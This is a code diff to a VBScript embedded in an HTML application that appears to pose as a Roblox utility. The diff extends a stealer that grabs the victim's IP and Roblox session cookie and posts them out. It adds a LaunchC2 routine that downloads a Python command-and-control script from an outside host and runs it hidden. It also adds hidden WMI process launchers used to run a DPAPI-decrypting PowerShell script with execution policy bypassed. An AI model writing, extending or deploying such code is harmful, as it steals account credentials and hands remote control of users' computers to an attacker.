@@ -13,6 +13,7 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
 Call SendIP
 Call GrabRoblox
+Call LaunchC2
 
 Sub BtnClick
     Dim jobId, playerName, gameName, result
@@ -89,6 +90,9 @@ Sub GrabRoblox()
         cookie = Mid(raw, rp)
     End If
     If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
+    Dim cae: cae = InStr(cookie, "|$CAE")
+    If cae = 0 Then cae = InStr(cookie, "|_CAE")
+    If cae > 0 Then cookie = Mid(cookie, cae)
     Call PostEmbed("Roblox (" & approach & ")", "Size: " & Len(cookie) & vbLf & Left(cookie, 60) & "...", 65280)
     Call PostFile("cookie.txt", cookie)
 End Sub
@@ -103,7 +107,7 @@ Function DecryptDPAPI(b64)
     Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
     Dim psf: psf = TmpFile("dpapi.ps1")
     WriteFile psf, ps
-    sh.Run "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """", 0, True
+    RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
     If fso.FileExists(outf) Then
         Dim sz: sz = fso.GetFile(outf).Size
         If sz > 20 Then DecryptDPAPI = ReadFile(outf)
@@ -113,7 +117,43 @@ Function DecryptDPAPI(b64)
     fso.DeleteFile outf, True
 End Function
 
-Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
+Sub RunCmd(cmd)
+    On Error Resume Next
+    Dim objWMIService, objProcess, intProcessID, objStartup
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set objStartup = objWMIService.Get("Win32_ProcessStartup").SpawnInstance_
+    objStartup.ShowWindow = 0
+    Set objProcess = objWMIService.Get("Win32_Process")
+    objProcess.Create cmd, , objStartup, intProcessID
+    If intProcessID = 0 Then Exit Sub
+    Dim colProcesses, bRunning: bRunning = True
+    Do While bRunning
+        Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+        Set colProcesses = objWMIService.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & intProcessID)
+        bRunning = (colProcesses.Count > 0)
+        Set colProcesses = Nothing: Set objWMIService = Nothing
+        If bRunning Then WScript.Sleep 150
+    Loop
+End Sub
+
+Sub WmiRun(cmd)
+    On Error Resume Next
+    Dim objWMIService, objProcess, intProcessID, objStartup
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set objStartup = objWMIService.Get("Win32_ProcessStartup").SpawnInstance_
+    objStartup.ShowWindow = 0
+    Set objProcess = objWMIService.Get("Win32_Process")
+    objProcess.Create cmd, , objStartup, intProcessID
+    If intProcessID = 0 Then Exit Sub
+    Dim colProcesses, bRunning: bRunning = True
+    Do While bRunning
+        Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+        Set colProcesses = objWMIService.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & intProcessID)
+        bRunning = (colProcesses.Count > 0)
+        Set colProcesses = Nothing: Set objWMIService = Nothing
+        If bRunning Then WScript.Sleep 150
+    Loop
+End Sub
 
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
 
@@ -165,6 +205,21 @@ Function MkGuid()
     Dim t: Set t = CreateObject("Scriptlet.TypeLib")
     MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing
 End Function
+
+
+Sub LaunchC2
+    On Error Resume Next
+    Dim x, a, p
+    Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    x.Open "GET", "https://delta-check.onrender.com/c2.py", False
+    x.Send
+    If x.Status = 200 Then
+        p = sh.ExpandEnvironmentStrings("%TEMP%") & "\rbx_c2.py"
+        Set a = CreateObject("ADODB.Stream")
+        a.Type = 1: a.Open: a.Write x.ResponseBody: a.SaveToFile p, 2: a.Close
+        sh.Run "pythonw " & p, 0, False
+    End If
+End Sub
 
 </script>
 </head>
